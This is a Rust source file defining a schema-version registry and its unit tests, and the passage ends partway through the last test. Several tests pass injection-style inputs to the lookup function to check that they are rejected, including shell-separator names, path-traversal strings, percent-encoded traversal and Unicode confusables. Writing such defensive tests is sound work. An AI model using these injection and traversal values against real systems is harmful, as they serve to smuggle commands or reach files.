//! Centralized schema version registry.
//!
//! All protocol schema version strings are defined here to provide a single
//! point of reference during protocol evolution.  When bumping a schema version,
//! update the constant here and grep for its old value to find any hardcoded
//! references that were missed.
//!
//! **Note:** existing modules still define their own local copies.  This registry
//! is the *authoritative* catalogue — a future migration task will re-export from
//! here.

// ── Runtime & Scheduling ───────────────────────────────────────────
pub const LANE_SCHEDULER: &str = "ls-v1.0";
pub const TIME_TRAVEL: &str = "ttr-v1.0";
pub const TIME_TRAVEL_ENGINE: &str = "ttr-v1.0";
pub const CANCELLABLE_TASK: &str = "cxt-v1.0";
pub const ISOLATION_MESH: &str = "isolation-mesh-v1.0";
pub const OBLIGATION_CHANNEL: &str = "och-v1.0";
pub const REGION_TREE: &str = "region-v1.0";
pub const NVERSION_ORACLE: &str = "nvo-v1.0";
pub const OPTIMIZATION_GOVERNOR: &str = "gov-v1.0";
pub const HARDWARE_PLANNER: &str = "hwp-v1.0";
pub const INCIDENT_LAB: &str = "incident-lab-v1.0";
pub const AUTHORITY_AUDIT: &str = "aa-v1.0";
pub const SPECULATION_PROOF_EXECUTOR: &str = "speculation-proof-v1.0";

// ── Control Plane ──────────────────────────────────────────────────
pub const TRANSITION_ABORT: &str = "ta-v1.0";
pub const CONTROL_LANE_POLICY: &str = "clp-v1.0";
pub const CONTROL_LANE_MAPPING: &str = "clm-v1.0";
pub const DPOR_EXPLORATION: &str = "dpor-v1.0";
pub const ROOT_POINTER_FORMAT: &str = "v1";
pub const EPOCH_TRANSITION_BARRIER: &str = "eb-v1.0";
pub const CANCELLATION_INJECTION: &str = "ci-v1.0";
pub const CANCELLATION_PROTOCOL: &str = "cp-v1.0";

// ── Connector ──────────────────────────────────────────────────────
pub const OBLIGATION_TRACKER: &str = "obl-v1.0";
pub const MIGRATION_PIPELINE: &str = "pipe-v1.0";
pub const SUPERVISION: &str = "sup-v1.0";
pub const CAPABILITY_GUARD: &str = "cap-v1.0";
pub const CAPABILITY_ARTIFACT: &str = "cart-v1.0";
pub const CLAIM_COMPILER: &str = "claim-compiler-v1.0";
pub const CONNECTOR_VERIFIER_SDK: &str = "ver-v1.0";
pub const N_VERSION_ORACLE: &str = "n-version-oracle-v1.0";
pub const TRANSPORT_FAULT_GATE: &str = "tfg-v1.0";
pub const CANCEL_INJECTION_GATE: &str = "cig-v1.0";
pub const DPOR_SCHEDULE_GATE: &str = "dsg-v1.0";
pub const SAGA: &str = "saga-v1.0";
pub const EVICTION_SAGA: &str = "es-v1.0";
pub const MIGRATION_ARTIFACT: &str = "ma-v1.0";
pub const CONNECTOR_CANCELLATION_PROTOCOL: &str = "cancel-v1.0";
pub const UNIVERSAL_VERIFIER_SDK: &str = "vsdk-v1.0";
pub const VEF_EXECUTION_RECEIPT: &str = "vef-execution-receipt-v1";
pub const VEF_POLICY_LANGUAGE: &str = "vef-policy-lang-v1";
pub const VEF_CONSTRAINT_COMPILER: &str = "vef-constraint-compiler-v1";
pub const VEF_POLICY_CONSTRAINTS: &str = "vef-policy-constraints-v1";

// ── Verifier & Evidence ────────────────────────────────────────────
pub const VERIFIER_SDK_API: &str = "1.0.0";
pub const VERIFIER_SDK_SCHEMA_TAG: &str = "vsk-v1.0";
pub const SDK_REPLAY_CAPSULE: &str = "replay-capsule-v1";
pub const VEP_REPLAY_CAPSULE: &str = "vep-replay-capsule-v2";
pub const VEF_CONSTRAINT_COMPILER_SCHEMA: &str = "vef-constraints-v1.0";
pub const VEF_CONSTRAINT_COMPILER_VERSION: &str = "1.0.0";
pub const VEF_EVIDENCE_CAPSULE: &str = "evidence-capsule-v1.0";
pub const VEF_VERIFICATION_STATE: &str = "verification-state-v1.0";
pub const VEF_PROOF_SCHEDULER: &str = "vef-proof-scheduler-v1";
pub const VEF_PROOF_GENERATOR: &str = "vef-proof-generator-v1";
pub const VEF_PROOF_GENERATOR_FORMAT: &str = "1.0.0";
pub const VEF_PROOF_VERIFIER: &str = "vef-proof-verifier-v1";
pub const VEF_PROOF_SERVICE: &str = "vef-proof-service-v1";
pub const VEF_SDK_INTEGRATION: &str = "vef-sdk-integration-v1";
pub const VEF_SDK_INTEGRATION_FORMAT: &str = "1.0.0";
pub const VEF_SDK_INTEGRATION_MIN_FORMAT: &str = "1.0.0";
pub const VEF_RECEIPT_CHAIN: &str = "vef-receipt-chain-v1";
pub const VEF_CONTROL_INTEGRATION: &str = "vef-control-integration-v1";

// ── Extensions ─────────────────────────────────────────────────────
pub const CAPABILITY_ARTIFACT_CONTRACT: &str = "capability-artifact-v1.0";

// ── Claims ─────────────────────────────────────────────────────────
pub const CLAIMS_CLAIM_COMPILER: &str = "claim-compiler-v1.0";

// ── Conformance ────────────────────────────────────────────────────
pub const CONFORMANCE_SUITE_SCHEMA: &str = "cs-v1.0";
pub const CONFORMANCE_SUITE_VERSION: &str = "1.0.0";

// ── Security ───────────────────────────────────────────────────────
pub const INTENT_FIREWALL: &str = "fw-v1.0";
pub const ZK_ATTESTATION: &str = "zka-v1.0";
pub const STAKING_GOVERNANCE: &str = "staking-v1.0";
pub const LINEAGE_TRACKER: &str = "ifl-v1.0";

// ── Registry ───────────────────────────────────────────────────────
pub const REGISTRY_STAKING_GOVERNANCE: &str = "staking-v1.0";

// ── Storage ────────────────────────────────────────────────────────
pub const STORAGE_MODEL: &str = "1.0.0";

// ── Supply Chain ───────────────────────────────────────────────────
pub const MANIFEST: &str = "1.0";
pub const EXTENSION_REGISTRY: &str = "ser-v2.0";
pub const MIGRATION_KIT: &str = "mke-v1.0";

// ── Remote ─────────────────────────────────────────────────────────
pub const IDEMPOTENCY_STORE: &str = "ids-v1.0";
pub const REMOTE_EVICTION_SAGA: &str = "es-v1.0";
pub const VIRTUAL_TRANSPORT_FAULTS: &str = "vtf-v1.0";

// ── Testing ────────────────────────────────────────────────────────
pub const SCENARIO_BUILDER: &str = "sb-v1.0";
pub const VIRTUAL_TRANSPORT: &str = "vt-v1.0";
pub const LAB_RUNTIME: &str = "lab-v1.0";

// ── Tools ──────────────────────────────────────────────────────────
pub const MIGRATION_INCIDENT_DATASETS: &str = "rds-v1.0";
pub const REPORT_OUTPUT_CONTRACT: &str = "roc-v1.0";
pub const SECURITY_TRUST_METRICS: &str = "secm-v1";
pub const BENCHMARK_SUITE_SCORING: &str = "sf-v1";
pub const BENCHMARK_SUITE_VERSION: &str = "1.0.0";
pub const BENCHMARK_METHODOLOGY: &str = "bmp-v1.0";
pub const VERIFIER_BENCHMARK_RELEASES: &str = "vbr-v1.0";
pub const SECURITY_OPS_CASE_STUDIES: &str = "csc-v1.0";
pub const FRONTIER_DEMO_GATE: &str = "demo-v1.0";
pub const EXTERNAL_REPLICATION_CLAIMS: &str = "erc-v1.0";
pub const COMPATIBILITY_CORRECTNESS_METRICS: &str = "ccm-v1.0";
pub const TRUST_ECONOMICS_DASHBOARD: &str = "ted-v1.0";
pub const MIGRATION_SPEED_FAILURE_METRICS: &str = "msf-v1.0";
pub const ENTERPRISE_GOVERNANCE: &str = "egi-v1.0";
pub const ADVERSARIAL_RESILIENCE_METRICS: &str = "arm-v1.0";
pub const MIGRATION_VALIDATION_COHORTS: &str = "mvc-v1.0";
pub const TRANSPARENT_REPORTS: &str = "tr-v1.0";
pub const PARTNER_LIGHTHOUSE_PROGRAMS: &str = "plp-v1.0";
pub const SAFE_EXTENSION_ONBOARDING: &str = "seo-v1.0";
pub const VERIFIER_TOOLKIT: &str = "vtk-v1.0";
pub const REDTEAM_EVALUATIONS: &str = "rte-v1.0";
pub const REPLAY_DETERMINISM_METRICS: &str = "rdm-v1.0";
pub const PERFORMANCE_HARDENING_METRICS: &str = "phm-v1.0";
pub const CONTAINMENT_REVOCATION_METRICS: &str = "crm-v1.0";
pub const VEF_PERF_BUDGET_GATE: &str = "1.0.0";
pub const COUNTERFACTUAL_REPLAY_ENGINE: &str = "counterfactual-v1";
pub const REPLAY_BUNDLE_POLICY: &str = "0.1.0";

// ── CLI ────────────────────────────────────────────────────────────
pub const VERIFY_CLI_CONTRACT: &str = "3.0.0";

// ── Verifier Economy ──────────────────────────────────────────────
// (re-states VEP_REPLAY_CAPSULE above; included for completeness of origin tracking)

// ── Utility ────────────────────────────────────────────────────────

/// Return all registered schema versions as `(name, version)` pairs.
/// Useful for diagnostics (e.g., `franken-node doctor --versions`).
pub fn all_versions() -> Vec<(&'static str, &'static str)> {
    vec![
        // Runtime & Scheduling
        ("lane_scheduler", LANE_SCHEDULER),
        ("time_travel", TIME_TRAVEL),
        ("time_travel_engine", TIME_TRAVEL_ENGINE),
        ("cancellable_task", CANCELLABLE_TASK),
        ("isolation_mesh", ISOLATION_MESH),
        ("obligation_channel", OBLIGATION_CHANNEL),
        ("region_tree", REGION_TREE),
        ("nversion_oracle", NVERSION_ORACLE),
        ("optimization_governor", OPTIMIZATION_GOVERNOR),
        ("hardware_planner", HARDWARE_PLANNER),
        ("incident_lab", INCIDENT_LAB),
        ("authority_audit", AUTHORITY_AUDIT),
        ("speculation_proof_executor", SPECULATION_PROOF_EXECUTOR),
        // Control Plane
        ("transition_abort", TRANSITION_ABORT),
        ("control_lane_policy", CONTROL_LANE_POLICY),
        ("control_lane_mapping", CONTROL_LANE_MAPPING),
        ("dpor_exploration", DPOR_EXPLORATION),
        ("root_pointer_format", ROOT_POINTER_FORMAT),
        ("epoch_transition_barrier", EPOCH_TRANSITION_BARRIER),
        ("cancellation_injection", CANCELLATION_INJECTION),
        ("cancellation_protocol", CANCELLATION_PROTOCOL),
        // Connector
        ("obligation_tracker", OBLIGATION_TRACKER),
        ("migration_pipeline", MIGRATION_PIPELINE),
        ("supervision", SUPERVISION),
        ("capability_guard", CAPABILITY_GUARD),
        ("capability_artifact", CAPABILITY_ARTIFACT),
        ("claim_compiler", CLAIM_COMPILER),
        ("connector_verifier_sdk", CONNECTOR_VERIFIER_SDK),
        ("n_version_oracle", N_VERSION_ORACLE),
        ("transport_fault_gate", TRANSPORT_FAULT_GATE),
        ("cancel_injection_gate", CANCEL_INJECTION_GATE),
        ("dpor_schedule_gate", DPOR_SCHEDULE_GATE),
        ("saga", SAGA),
        ("eviction_saga", EVICTION_SAGA),
        ("migration_artifact", MIGRATION_ARTIFACT),
        (
            "connector_cancellation_protocol",
            CONNECTOR_CANCELLATION_PROTOCOL,
        ),
        ("universal_verifier_sdk", UNIVERSAL_VERIFIER_SDK),
        ("vef_execution_receipt", VEF_EXECUTION_RECEIPT),
        ("vef_policy_language", VEF_POLICY_LANGUAGE),
        ("vef_constraint_compiler", VEF_CONSTRAINT_COMPILER),
        ("vef_policy_constraints", VEF_POLICY_CONSTRAINTS),
        // Verifier & Evidence
        ("verifier_sdk_api", VERIFIER_SDK_API),
        ("verifier_sdk_schema_tag", VERIFIER_SDK_SCHEMA_TAG),
        ("sdk_replay_capsule", SDK_REPLAY_CAPSULE),
        ("vep_replay_capsule", VEP_REPLAY_CAPSULE),
        (
            "vef_constraint_compiler_schema",
            VEF_CONSTRAINT_COMPILER_SCHEMA,
        ),
        (
            "vef_constraint_compiler_version",
            VEF_CONSTRAINT_COMPILER_VERSION,
        ),
        ("vef_evidence_capsule", VEF_EVIDENCE_CAPSULE),
        ("vef_verification_state", VEF_VERIFICATION_STATE),
        ("vef_proof_scheduler", VEF_PROOF_SCHEDULER),
        ("vef_proof_generator", VEF_PROOF_GENERATOR),
        ("vef_proof_generator_format", VEF_PROOF_GENERATOR_FORMAT),
        ("vef_proof_verifier", VEF_PROOF_VERIFIER),
        ("vef_proof_service", VEF_PROOF_SERVICE),
        ("vef_sdk_integration", VEF_SDK_INTEGRATION),
        ("vef_sdk_integration_format", VEF_SDK_INTEGRATION_FORMAT),
        (
            "vef_sdk_integration_min_format",
            VEF_SDK_INTEGRATION_MIN_FORMAT,
        ),
        ("vef_receipt_chain", VEF_RECEIPT_CHAIN),
        ("vef_control_integration", VEF_CONTROL_INTEGRATION),
        // Extensions
        ("capability_artifact_contract", CAPABILITY_ARTIFACT_CONTRACT),
        // Claims
        ("claims_claim_compiler", CLAIMS_CLAIM_COMPILER),
        // Conformance
        ("conformance_suite_schema", CONFORMANCE_SUITE_SCHEMA),
        ("conformance_suite_version", CONFORMANCE_SUITE_VERSION),
        // Security
        ("intent_firewall", INTENT_FIREWALL),
        ("zk_attestation", ZK_ATTESTATION),
        ("staking_governance", STAKING_GOVERNANCE),
        ("lineage_tracker", LINEAGE_TRACKER),
        // Registry
        ("registry_staking_governance", REGISTRY_STAKING_GOVERNANCE),
        // Storage
        ("storage_model", STORAGE_MODEL),
        // Supply Chain
        ("manifest", MANIFEST),
        ("extension_registry", EXTENSION_REGISTRY),
        ("migration_kit", MIGRATION_KIT),
        // Remote
        ("idempotency_store", IDEMPOTENCY_STORE),
        ("remote_eviction_saga", REMOTE_EVICTION_SAGA),
        ("virtual_transport_faults", VIRTUAL_TRANSPORT_FAULTS),
        // Testing
        ("scenario_builder", SCENARIO_BUILDER),
        ("virtual_transport", VIRTUAL_TRANSPORT),
        ("lab_runtime", LAB_RUNTIME),
        // Tools
        ("migration_incident_datasets", MIGRATION_INCIDENT_DATASETS),
        ("report_output_contract", REPORT_OUTPUT_CONTRACT),
        ("security_trust_metrics", SECURITY_TRUST_METRICS),
        ("benchmark_suite_scoring", BENCHMARK_SUITE_SCORING),
        ("benchmark_suite_version", BENCHMARK_SUITE_VERSION),
        ("benchmark_methodology", BENCHMARK_METHODOLOGY),
        ("verifier_benchmark_releases", VERIFIER_BENCHMARK_RELEASES),
        ("security_ops_case_studies", SECURITY_OPS_CASE_STUDIES),
        ("frontier_demo_gate", FRONTIER_DEMO_GATE),
        ("external_replication_claims", EXTERNAL_REPLICATION_CLAIMS),
        (
            "compatibility_correctness_metrics",
            COMPATIBILITY_CORRECTNESS_METRICS,
        ),
        ("trust_economics_dashboard", TRUST_ECONOMICS_DASHBOARD),
        (
            "migration_speed_failure_metrics",
            MIGRATION_SPEED_FAILURE_METRICS,
        ),
        ("enterprise_governance", ENTERPRISE_GOVERNANCE),
        (
            "adversarial_resilience_metrics",
            ADVERSARIAL_RESILIENCE_METRICS,
        ),
        ("migration_validation_cohorts", MIGRATION_VALIDATION_COHORTS),
        ("transparent_reports", TRANSPARENT_REPORTS),
        ("partner_lighthouse_programs", PARTNER_LIGHTHOUSE_PROGRAMS),
        ("safe_extension_onboarding", SAFE_EXTENSION_ONBOARDING),
        ("verifier_toolkit", VERIFIER_TOOLKIT),
        ("redteam_evaluations", REDTEAM_EVALUATIONS),
        ("replay_determinism_metrics", REPLAY_DETERMINISM_METRICS),
        (
            "performance_hardening_metrics",
            PERFORMANCE_HARDENING_METRICS,
        ),
        (
            "containment_revocation_metrics",
            CONTAINMENT_REVOCATION_METRICS,
        ),
        ("vef_perf_budget_gate", VEF_PERF_BUDGET_GATE),
        ("counterfactual_replay_engine", COUNTERFACTUAL_REPLAY_ENGINE),
        ("replay_bundle_policy", REPLAY_BUNDLE_POLICY),
        // CLI
        ("verify_cli_contract", VERIFY_CLI_CONTRACT),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Maximum timing samples to prevent memory exhaustion in timing tests.
    const MAX_TIMING_SAMPLES: usize = 1000;

    /// Maximum test results per thread to prevent memory exhaustion in concurrent tests.
    const MAX_THREAD_RESULTS: usize = 1000;

    /// Maximum accumulated results to prevent memory exhaustion when collecting from all threads.
    const MAX_TOTAL_RESULTS: usize = 8000;

    /// Push item to vector with bounded capacity to prevent memory exhaustion.
    /// When capacity is exceeded, removes oldest entries to maintain the limit.
    fn push_bounded<T>(items: &mut Vec<T>, item: T, cap: usize) {
        if cap == 0 {
            items.clear();
            return;
        }
        if items.len() >= cap {
            let overflow = items.len().saturating_sub(cap).saturating_add(1);
            items.drain(0..overflow);
        }
        items.push(item);
    }

    /// Extend vector with bounded capacity to prevent memory exhaustion.
    /// When capacity would be exceeded, removes oldest entries to maintain the limit.
    fn extend_bounded<T>(items: &mut Vec<T>, new_items: Vec<T>, cap: usize) {
        if cap == 0 {
            items.clear();
            return;
        }
        for item in new_items {
            push_bounded(items, item, cap);
        }
    }

    fn lookup(name: &str) -> Option<&'static str> {
        all_versions()
            .into_iter()
            .find_map(|(registered_name, version)| (registered_name == name).then_some(version))
    }

    fn is_semver_triplet(value: &str) -> bool {
        let mut parts = value.split('.');
        let Some(major) = parts.next() else {
            return false;
        };
        let Some(minor) = parts.next() else {
            return false;
        };
        let Some(patch) = parts.next() else {
            return false;
        };
        parts.next().is_none()
            && [major, minor, patch]
                .iter()
                .all(|part| !part.is_empty() && part.bytes().all(|byte| byte.is_ascii_digit()))
    }

    #[test]
    fn all_versions_returns_nonempty() {
        let versions = all_versions();
        assert!(!versions.is_empty());
    }

    #[test]
    fn all_versions_has_no_duplicate_names() {
        let versions = all_versions();
        let mut names: Vec<&str> = versions.iter().map(|(name, _)| *name).collect();
        names.sort();
        let before = names.len();
        names.dedup();
        assert_eq!(
            before,
            names.len(),
            "duplicate name found in all_versions()"
        );
    }

    #[test]
    fn all_versions_has_no_empty_values() {
        for (name, value) in all_versions() {
            assert!(!name.is_empty(), "empty name in all_versions()");
            assert!(
                !value.is_empty(),
                "empty value for {name} in all_versions()"
            );
        }
    }

    #[test]
    #[cfg(feature = "control-plane")]
    fn representative_runtime_and_connector_versions_match_authoritative_sources() {
        assert_eq!(
            NVERSION_ORACLE,
            crate::runtime::nversion_oracle::SCHEMA_VERSION
        );
        assert_eq!(
            N_VERSION_ORACLE,
            crate::connector::n_version_oracle::SCHEMA_VERSION
        );
        assert_eq!(
            DPOR_EXPLORATION,
            crate::control_plane::dpor_exploration::SCHEMA_VERSION
        );
    }

    #[test]
    fn representative_supply_chain_and_storage_versions_match_authoritative_sources() {
        assert_eq!(
            EXTENSION_REGISTRY,
            crate::supply_chain::extension_registry::REGISTRY_VERSION
        );
        assert_eq!(STORAGE_MODEL, crate::storage::models::MODEL_SCHEMA_VERSION);
    }

    #[test]
    #[cfg(all(feature = "admin-tools", feature = "advanced-features"))]
    fn representative_tool_versions_match_authoritative_sources() {
        assert_eq!(
            BENCHMARK_SUITE_SCORING,
            crate::tools::benchmark_suite::SCORING_FORMULA_VERSION
        );
        assert_eq!(
            BENCHMARK_SUITE_VERSION,
            crate::tools::benchmark_suite::SUITE_VERSION
        );
        assert_eq!(
            BENCHMARK_METHODOLOGY,
            crate::tools::benchmark_methodology::PUB_VERSION
        );
        assert_eq!(
            VERIFIER_BENCHMARK_RELEASES,
            crate::tools::verifier_benchmark_releases::SCHEMA_VERSION
        );
    }

    #[test]
    fn all_versions_contains_representative_required_keys() {
        assert_eq!(lookup("lane_scheduler"), Some(LANE_SCHEDULER));
        assert_eq!(lookup("control_lane_policy"), Some(CONTROL_LANE_POLICY));
        assert_eq!(lookup("n_version_oracle"), Some(N_VERSION_ORACLE));
        assert_eq!(lookup("vef_proof_generator"), Some(VEF_PROOF_GENERATOR));
        assert_eq!(lookup("extension_registry"), Some(EXTENSION_REGISTRY));
        assert_eq!(lookup("verify_cli_contract"), Some(VERIFY_CLI_CONTRACT));
    }

    #[test]
    fn lookup_rejects_unknown_empty_and_case_mismatched_names() {
        assert!(lookup("").is_none());
        assert!(lookup("does_not_exist").is_none());
        assert!(lookup("Lane_Scheduler").is_none());
        assert!(lookup("LANE_SCHEDULER").is_none());
    }

    #[test]
    fn lookup_rejects_near_miss_names_without_normalization() {
        assert!(lookup("lane-scheduler").is_none());
        assert!(lookup(" lane_scheduler").is_none());
        assert!(lookup("lane_scheduler ").is_none());
        assert!(lookup("lane_scheduler\0").is_none());
    }

    #[test]
    fn lookup_rejects_path_like_names_without_normalization() {
        for name in [
            "../lane_scheduler",
            "lane_scheduler/../verify_cli_contract",
            "runtime/lane_scheduler",
            "lane_scheduler\\verify_cli_contract",
        ] {
            assert!(lookup(name).is_none(), "path-like lookup matched: {name:?}");
        }
    }

    #[test]
    fn lookup_rejects_shell_metacharacter_names() {
        for name in [
            "lane_scheduler;verify_cli_contract",
            "lane_scheduler|verify_cli_contract",
            "`lane_scheduler`",
            "lane_scheduler&verify_cli_contract",
        ] {
            assert!(
                lookup(name).is_none(),
                "shell-like lookup unexpectedly matched: {name:?}"
            );
        }
    }

    #[test]
    fn lookup_rejects_unicode_and_control_character_names() {
        for name in [
            "lane_scheduler\n",
            "\tlane_scheduler",
            "lane_scheduler\u{200b}",
            "lané_scheduler",
        ] {
            assert!(
                lookup(name).is_none(),
                "non-canonical lookup unexpectedly matched: {name:?}"
            );
        }
    }

    #[test]
    fn lookup_rejects_display_and_constant_style_names() {
        for name in [
            "Lane Scheduler",
            "CONTROL LANE POLICY",
            "VEF Proof Generator",
            "VERIFY_CLI_CONTRACT",
        ] {
            assert!(
                lookup(name).is_none(),
                "display or constant-style lookup unexpectedly matched: {name:?}"
            );
        }
    }

    #[test]
    fn version_names_are_ascii_lower_snake_case() {
        for (name, _) in all_versions() {
            assert!(
                name.bytes()
                    .all(|byte| byte.is_ascii_lowercase() || byte.is_ascii_digit() || byte == b'_'),
                "invalid registry name characters in {name:?}"
            );
            assert!(!name.starts_with('_'), "leading underscore in {name:?}");
            assert!(!name.ends_with('_'), "trailing underscore in {name:?}");
            assert!(!name.contains("__"), "empty name segment in {name:?}");
        }
    }

    #[test]
    fn version_names_do_not_contain_path_or_shell_separators() {
        for (name, _) in all_versions() {
            for forbidden in ['/', '\\', ';', '|', '&', '`', '.'] {
                assert!(
                    !name.contains(forbidden),
                    "registry name {name:?} contains forbidden separator {forbidden:?}"
                );
            }
        }
    }

    #[test]
    fn version_values_are_printable_ascii_without_whitespace_or_nul() {
        for (name, value) in all_versions() {
            assert!(value.is_ascii(), "non-ascii schema value for {name}");
            assert!(
                !value.bytes().any(|byte| byte.is_ascii_control()),
                "control byte in schema value for {name}"
            );
            assert!(
                !value.bytes().any(|byte| byte.is_ascii_whitespace()),
                "whitespace in schema value for {name}"
            );
            assert!(!value.contains('\0'), "nul byte in schema value for {name}");
        }
    }

    #[test]
    fn version_values_do_not_contain_path_or_shell_separators() {
        for (name, value) in all_versions() {
            for forbidden in ['/', '\\', ';', '|', '&', '`'] {
                assert!(
                    !value.contains(forbidden),
                    "schema value for {name} contains forbidden separator {forbidden:?}"
                );
            }
        }
    }

    #[test]
    fn version_values_do_not_have_empty_dash_or_dot_segments() {
        for (name, value) in all_versions() {
            assert!(
                !value.starts_with('-'),
                "leading dash in schema value for {name}"
            );
            assert!(
                !value.ends_with('-'),
                "trailing dash in schema value for {name}"
            );
            assert!(
                !value.starts_with('.'),
                "leading dot in schema value for {name}"
            );
            assert!(
                !value.ends_with('.'),
                "trailing dot in schema value for {name}"
            );
            assert!(
                !value.contains("--"),
                "empty dash segment in schema value for {name}"
            );
            assert!(
                !value.contains(".."),
                "empty dot segment in schema value for {name}"
            );
        }
    }

    #[test]
    fn non_semver_schema_tags_are_not_misclassified_as_semver_triplets() {
        for (name, value) in [
            ("root_pointer_format", ROOT_POINTER_FORMAT),
            ("manifest", MANIFEST),
            ("extension_registry", EXTENSION_REGISTRY),
            ("security_trust_metrics", SECURITY_TRUST_METRICS),
            ("vef_execution_receipt", VEF_EXECUTION_RECEIPT),
            ("counterfactual_replay_engine", COUNTERFACTUAL_REPLAY_ENGINE),
        ] {
            assert!(
                !is_semver_triplet(value),
                "{name} must remain a schema tag, not a semver-only triplet"
            );
        }
    }

    #[test]
    fn canonical_names_do_not_resolve_with_version_suffixes() {
        for name in [
            "lane_scheduler_v1",
            "control_lane_policy_v1_0",
            "vef_proof_generator_v1",
            "verify_cli_contract_3_0_0",
        ] {
            assert!(
                lookup(name).is_none(),
                "version-suffixed lookup unexpectedly matched: {name:?}"
            );
        }
    }

    #[test]
    fn intentional_aliases_are_explicitly_equal() {
        assert_eq!(TIME_TRAVEL, TIME_TRAVEL_ENGINE);
        assert_eq!(STAKING_GOVERNANCE, REGISTRY_STAKING_GOVERNANCE);
        assert_eq!(CLAIM_COMPILER, CLAIMS_CLAIM_COMPILER);
        assert_eq!(EVICTION_SAGA, REMOTE_EVICTION_SAGA);
    }

    #[test]
    fn unrelated_domains_do_not_collapse_to_same_schema_value() {
        assert_ne!(LANE_SCHEDULER, CONTROL_LANE_POLICY);
        assert_ne!(N_VERSION_ORACLE, NVERSION_ORACLE);
        assert_ne!(VEF_PROOF_GENERATOR, VEF_PROOF_SCHEDULER);
        assert_ne!(REPLAY_BUNDLE_POLICY, STORAGE_MODEL);
        assert_ne!(VERIFY_CLI_CONTRACT, VERIFIER_SDK_API);
    }

    #[test]
    fn semantic_version_values_remain_numeric_triplets() {
        for (name, value) in [
            ("verifier_sdk_api", VERIFIER_SDK_API),
            (
                "vef_constraint_compiler_version",
                VEF_CONSTRAINT_COMPILER_VERSION,
            ),
            ("vef_proof_generator_format", VEF_PROOF_GENERATOR_FORMAT),
            ("vef_sdk_integration_format", VEF_SDK_INTEGRATION_FORMAT),
            (
                "vef_sdk_integration_min_format",
                VEF_SDK_INTEGRATION_MIN_FORMAT,
            ),
            ("conformance_suite_version", CONFORMANCE_SUITE_VERSION),
            ("storage_model", STORAGE_MODEL),
            ("benchmark_suite_version", BENCHMARK_SUITE_VERSION),
            ("vef_perf_budget_gate", VEF_PERF_BUDGET_GATE),
            ("verify_cli_contract", VERIFY_CLI_CONTRACT),
        ] {
            let parts: Vec<&str> = value.split('.').collect();
            assert_eq!(parts.len(), 3, "{name} must be major.minor.patch");
            assert!(
                parts
                    .iter()
                    .all(|part| !part.is_empty() && part.bytes().all(|byte| byte.is_ascii_digit())),
                "{name} has a non-numeric semantic version segment"
            );
        }
    }

    #[test]
    fn semver_triplet_rejects_missing_patch_segment() {
        assert!(!is_semver_triplet("1.0"));
    }

    #[test]
    fn semver_triplet_rejects_extra_segment() {
        assert!(!is_semver_triplet("1.0.0.1"));
    }

    #[test]
    fn semver_triplet_rejects_empty_middle_segment() {
        assert!(!is_semver_triplet("1..0"));
    }

    #[test]
    fn semver_triplet_rejects_prefixed_major_segment() {
        assert!(!is_semver_triplet("v1.0.0"));
    }

    #[test]
    fn semver_triplet_rejects_whitespace_padded_value() {
        assert!(!is_semver_triplet(" 1.0.0 "));
    }

    #[test]
    fn semver_triplet_rejects_prerelease_suffix() {
        assert!(!is_semver_triplet("1.0.0-alpha"));
    }

    #[test]
    fn lookup_rejects_url_encoded_path_separators() {
        for name in [
            "lane_scheduler%2fverify_cli_contract",
            "lane_scheduler%5cverify_cli_contract",
            "%2elane_scheduler",
        ] {
            assert!(
                lookup(name).is_none(),
                "encoded separator lookup unexpectedly matched: {name:?}"
            );
        }
    }

    #[test]
    fn lookup_rejects_query_fragment_and_colon_suffixes() {
        for name in [
            "lane_scheduler?version=1",
            "lane_scheduler#latest",
            "lane_scheduler:latest",
        ] {
            assert!(
                lookup(name).is_none(),
                "decorated lookup unexpectedly matched: {name:?}"
            );
        }
    }

    #[test]
    fn lookup_rejects_boundary_and_empty_segment_underscore_names() {
        for name in [
            "_lane_scheduler",
            "lane_scheduler_",
            "lane__scheduler",
            "control__lane_policy",
        ] {
            assert!(
                lookup(name).is_none(),
                "malformed underscore lookup unexpectedly matched: {name:?}"
            );
        }
    }

    #[test]
    fn lookup_rejects_json_pointer_and_selector_names() {
        for name in [
            "/lane_scheduler",
            "versions[0]",
            "all_versions.0",
            "$.lane_scheduler",
        ] {
            assert!(
                lookup(name).is_none(),
                "selector-style lookup unexpectedly matched: {name:?}"
            );
        }
    }

    #[test]
    fn lookup_rejects_encoded_whitespace_and_nul_names() {
        for name in [
            "lane_scheduler%20",
            "lane_scheduler%09",
            "lane_scheduler%00",
            "lane_scheduler\\0",
        ] {
            assert!(
                lookup(name).is_none(),
                "encoded whitespace lookup unexpectedly matched: {name:?}"
            );
        }
    }

    #[test]
    fn lookup_rejects_percent_encoded_canonical_name_variants() {
        for name in [
            "lane%5fscheduler",
            "lane%5Fscheduler",
            "%6cane_scheduler",
            "lane_scheduler%2e",
        ] {
            assert!(
                lookup(name).is_none(),
                "percent-encoded canonical lookup unexpectedly matched: {name:?}"
            );
        }
    }

    #[test]
    fn lookup_rejects_double_encoded_name_boundaries() {
        for name in [
            "lane%255fscheduler",
            "lane_scheduler%2520",
            "%252elane_scheduler",
            "lane_scheduler%2500",
        ] {
            assert!(
                lookup(name).is_none(),
                "double-encoded lookup unexpectedly matched: {name:?}"
            );
        }
    }

    #[test]
    fn lookup_rejects_unicode_confusable_name_variants() {
        for name in [
            "lan\u{ff45}_scheduler",
            "lane_schedul\u{0435}r",
            "lane\u{200d}_scheduler",
            "lane_scheduler\u{0301}",
        ] {
            assert!(
                lookup(name).is_none(),
                "unicode-confusable lookup unexpectedly matched: {name:?}"
            );
        }
    }

    #[test]
    fn lookup_rejects_encoded_traversal_and_separator_variants() {
        for name in [
            "..%2flane_scheduler",
            "%2e%2e/lane_scheduler",
            "lane_scheduler%2f..%2fverify_cli_contract",
            "lane_scheduler%5c..%5cverify_cli_contract",
        ] {
            assert!(
                lookup(name).is_none(),
                "encoded traversal lookup unexpectedly matched: {name:?}"
            );
        }
    }

    #[test]
    fn lookup_rejects_registered_version_values_as_names() {
        for name in [
            LANE_SCHEDULER,
            VERIFY_CLI_CONTRACT,
            VEF_PROOF_GENERATOR,
            STORAGE_MODEL,
            STAKING_GOVERNANCE,
        ] {
            assert!(
                lookup(name).is_none(),
                "schema version value was accepted as a registry name: {name:?}"
            );
        }
    }

    #[test]
    fn semver_triplet_rejects_radix_exponent_and_grouped_segments() {
        for value in ["0x1.0.0", "0b1.0.0", "1e3.0.0", "1_000.0.0", "1,000.0.0"] {
            assert!(
                !is_semver_triplet(value),
                "non-decimal segment unexpectedly parsed: {value:?}"
            );
        }
    }

    #[test]
    fn semver_triplet_rejects_segment_internal_spacing_and_controls() {
